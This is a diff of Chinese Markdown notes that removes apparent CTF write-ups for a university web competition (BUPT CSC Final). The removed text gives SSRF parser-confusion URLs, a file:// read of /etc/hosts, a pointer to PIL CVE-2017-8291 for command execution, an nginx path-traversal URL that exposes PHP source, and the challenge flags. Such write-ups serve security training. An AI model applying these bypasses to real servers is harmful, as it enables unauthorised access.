@@ -219,69 +219,8 @@ int main(){
 
 提交，一百分到手。
 
-1. 观察, 随便输入一个url, 发现提示  
-![](file:///C:\Users\FFY\Documents\Tencent Files\1836017424\Image\Group\UV`EEB}4`F4WGK(%6_QI46O.png)  
-  
-2. SSRF的各种绕过  
-Orange师傅的A New Era of SSRF (Top 10 web hacking techniques of 2017) + PIL CVE (CVE-2017-8291)  
-读本地文件(然而我提示了这个机器上没有flag, 在别的机器上), 所以考虑读hosts找内网网端 file://localhost/etc/hosts  
-(这台腾讯云只能192了, 现场是![](file:///C:\Users\FFY\AppData\Local\Temp\%W@GJ$ACOF(TYDYECOKVDYB.png)172.18.0.0/24)  
-3. ssrf找东西  
-http://foo@192.168.64.2:80@localhost/  
-找到内网的神奇的代码  
-4. 翻内网  
-http://foo@192.168.64.2:80@localhost/robots.txt -> 给你们留的答案  
-http://foo@192.168.64.2:80@localhost/static/poc.png -> 需要一点魔改的答案  
-5. PIL CVE-2017-8291  
-执行命令的地方没写东西, 你们自己搞  
-![](file:///C:\Users\FFY\Documents\Tencent Files\1836017424\Image\Group\Y3N7{A@~R2G@Y7QEGIR4ZCC.png)  
-6. 然后本地托管一个文件服务器  
-把你的url提交上去  
-http://foo@192.168.64.2:80@localhost/?url=http://0.0.0.0/xx.png  
-完成
-
-“北邮-垃圾web狗 22:47:09 查看原文  
-  
-1. 观察  
-http://58.87.73.74:8084/  
-http://58.87.73.74:8084/flag.php  
-2. 只有一个flag路由, 代码中提示try to read my source.  
-[图片]  
-3. 除了静态文件statics路由和flag.php/index.php无其他文件  
-观察服务器Server: nginx  
-4. Breaking Parser Logic: Take Your Path Normalization off and Pop 0days Out! (Top 10 web hacking techniques of 2018)  
-http://58.87.73.74:8084/statics../flag.php  
-下载到flag.php的代码  
-5. php的一个小trick  
-[图片]
-
-对了  
-BUPT CSC Final  
-Web1  
-  
-Flag: BUPT{ng1nx_Can_mak3_th1ngs_n0t_Ok}  
-  
-Description: nginx can make PHP easier  
-  
-Port: 8081  
-  
-Web2  
-  
-Flag: BUPT{55Rf_1s_ann0y1ng_BuT_C@n_l3ad_t0_RC3}  
-  
-Description: 管理员在别的机器上藏了一份大礼哦  
-  
-Port: 8082  
-  
-Web3  
-  
-Flag: BUPT{x55_1s_interesting_t00}  
-  
-Description: 该交作业啦!  
-  
-Port: 8083
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjA4MDk2NzA2Myw5NzgwNTE0OTMsLTQ2Mz
-g3NTA0OCwtMTA0NTE4NDg2LC04NDcyNjAxMzAsLTE5OTkyMzQ3
-MiwzOTI2MjQwNzAsNzM2NDQ4MjMxXX0=
+eyJoaXN0b3J5IjpbLTMyMDQ4NTU1OCwyMDgwOTY3MDYzLDk3OD
+A1MTQ5MywtNDYzODc1MDQ4LC0xMDQ1MTg0ODYsLTg0NzI2MDEz
+MCwtMTk5OTIzNDcyLDM5MjYyNDA3MCw3MzY0NDgyMzFdfQ==
 -->
